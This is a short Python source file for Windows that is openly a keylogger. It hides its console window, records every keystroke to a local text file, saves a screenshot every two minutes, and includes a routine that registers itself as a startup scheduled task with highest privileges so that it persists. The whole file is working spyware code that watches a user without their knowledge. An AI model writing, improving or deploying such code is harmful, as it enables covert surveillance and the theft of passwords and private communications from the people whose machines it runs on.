import os
import sys
import logging
from pynput.keyboard import Key, Listener
from PIL import ImageGrab
import threading
import time
import subprocess
import win32console
import win32gui

log_file = "keylogss.txt"
stop_key = Key.esc  # Key to stop logging
task_name = "KeyloggerTask"

stop_count = 0
stop_after = 2  # Press Esc twice to stop

def setup_logging():
    current_dir = os.path.dirname(os.path.abspath(__file__))
    log_path = os.path.join(current_dir, log_file)

    logging.basicConfig(filename=log_path,
                        level=logging.DEBUG,
                        format="%(asctime)s: %(message)s")

def on_press(key):
    global stop_count
    
    if key == stop_key:
        stop_count += 1
        if stop_count >= stop_after:
            return False  # Stop the listener

    logging.info(str(key))

def take_screenshot():
    current_dir = os.path.dirname(os.path.abspath(__file__))
    while True:
        screenshot = ImageGrab.grab()
        screenshot.save(os.path.join(current_dir, f"screenshot_{int(time.time())}.png"))
        time.sleep(120)  # Wait for 2 minutes

# Hide the console window
window = win32console.GetConsoleWindow()
win32gui.ShowWindow(window, 0)

# Start the screenshot thread
screenshot_thread = threading.Thread(target=take_screenshot, daemon=True)
screenshot_thread.start()

# Set up logging
setup_logging()

# Start listening for key presses
with Listener(on_press=on_press) as listener:
    listener.join()

def create_scheduled_task():
    python_exe = sys.executable
    script_path = os.path.abspath(__file__)

    # Command to create a scheduled task
    command = f'schtasks /create /tn "{task_name}" /tr "{python_exe} {script_path} --scheduled-task" /sc onstart /rl highest /f'
    try:
        subprocess.run(command, check=True, shell=True)
        print("Scheduled task created successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Failed to create scheduled task: {e}")

# Check if the script is running as a scheduled task
if "--scheduled-task" not in sys.argv:
    create_scheduled_task()
    sys.exit()
